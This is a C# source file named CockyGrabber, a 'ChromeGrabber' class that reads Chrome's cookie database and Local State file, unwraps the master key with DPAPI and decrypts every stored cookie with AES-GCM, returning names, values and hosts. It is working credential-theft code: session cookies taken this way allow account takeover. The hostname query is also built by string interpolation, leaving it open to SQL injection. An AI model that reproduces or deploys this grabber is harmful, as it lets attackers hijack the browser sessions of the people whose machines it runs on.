﻿using Newtonsoft.Json.Linq;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Cookie = CockyGrabber.Classes.Cookie;

//  Using:
//   Org.BouncyCastle
//   Microsoft.Win32
//   System.Security.Cryptography

namespace CockyGrabber
{
    public class ChromeGrabber
    {
        public const string ChromeCookiePath = @"C:\Users\User\AppData\Local\Google\Chrome\User Data\Default\Cookies";
        public const string ChromeKeyPath = @"C:\Users\User\AppData\Local\Google\Chrome\User Data\Local State";
        

        /// <summary>
        /// Returns a value depending on if the File "Cookies" was found
        /// </summary>
        /// <returns>true if Cookies was found and false if not</returns>
        public bool CookiesExists()
        {
            if (File.Exists(ChromeCookiePath))
                return true;
            return false;
        }
        /// <summary>
        /// Returns a value depending on if the File "Local State" was found
        /// </summary>
        /// <returns>true if File was found and false if not</returns>
        public bool KeyExists()
        {
            if (File.Exists(ChromeKeyPath))
                return true;
            return false;
        }


        public List<Cookie> GetCookiesByHostname(string hostName, byte[] key)
        {
            List<Cookie> cookies = new List<Cookie>();
            if (hostName == null) throw new ArgumentNullException("hostName"); // throw ArgumentNullException if hostName is null
            if (!CookiesExists()) throw new FileNotFoundException("Cant find cookie store", ChromeCookiePath);  // throw FileNotFoundException if "Chrome\User Data\Default\Cookies" not found

            using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={ChromeCookiePath};pooling=false"))
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = $"SELECT name,encrypted_value,host_key FROM cookies WHERE host_key = '{hostName}'";

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        cookies.Add(new Cookie()
                        {
                            Name = reader.GetString(0),
                            Value = DecryptWithKey((byte[])reader[1], key, 3),
                            HostName = reader.GetString(2)
                        });
                    }
                }
                conn.Close();
            }
            return cookies;
        }
        public List<Cookie> GetAllCookies(byte[] key)
        {
            List<Cookie> cookies = new List<Cookie>();
            if (!CookiesExists()) throw new FileNotFoundException("Cant find cookie store", ChromeCookiePath);  // throw FileNotFoundException if "Chrome\User Data\Default\Cookies" not found

            using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={ChromeCookiePath};pooling=false"))
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = $"SELECT name,encrypted_value,host_key FROM cookies";

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        cookies.Add(new Cookie()
                        {
                            Name = reader.GetString(0),
                            Value = DecryptWithKey((byte[])reader[1], key, 3),
                            HostName = reader.GetString(2)
                        });
                    }
                }
                conn.Close();
            }
            return cookies;
        }


        /// <summary>
        /// Gets the key to decrypt a DB Value
        /// </summary>
        /// <returns>Key to decrypt DB Value</returns>
        public byte[] GetKey()
        {
            string encKey = File.ReadAllText(ChromeKeyPath); // reads the file (string)
            encKey = JObject.Parse(encKey)["os_crypt"]["encrypted_key"].ToString(); // parses the string
            return ProtectedData.Unprotect(Convert.FromBase64String(encKey).Skip(5).ToArray(), null, DataProtectionScope.LocalMachine); // decrypts the key and returns a byte Array
        }

        private string DecryptWithKey(byte[] msg, byte[] key, int nonSecretPayloadLength)
        {
            const int KEY_BIT_SIZE = 256;
            const int MAC_BIT_SIZE = 128;
            const int NONCE_BIT_SIZE = 96;

            if (key == null || key.Length != KEY_BIT_SIZE / 8)
                throw new ArgumentException($"Key needs to be {KEY_BIT_SIZE} bit!", "key");
            if (msg == null || msg.Length == 0)
                throw new ArgumentException("Message required!", "message");

            using (var cipherStream = new MemoryStream(msg))
            using (var cipherReader = new BinaryReader(cipherStream))
            {
                var nonSecretPayload = cipherReader.ReadBytes(nonSecretPayloadLength);
                var nonce = cipherReader.ReadBytes(NONCE_BIT_SIZE / 8);
                var cipher = new GcmBlockCipher(new AesEngine());
                var parameters = new AeadParameters(new KeyParameter(key), MAC_BIT_SIZE, nonce);
                cipher.Init(false, parameters);
                var cipherText = cipherReader.ReadBytes(msg.Length);
                var plainText = new byte[cipher.GetOutputSize(cipherText.Length)];
                try
                {
                    var len = cipher.ProcessBytes(cipherText, 0, cipherText.Length, plainText, 0);
                    cipher.DoFinal(plainText, len);
                }
                catch (InvalidCipherTextException)
                {
                    return null;
                }
                return Encoding.Default.GetString(plainText);
            }
        }
    }
}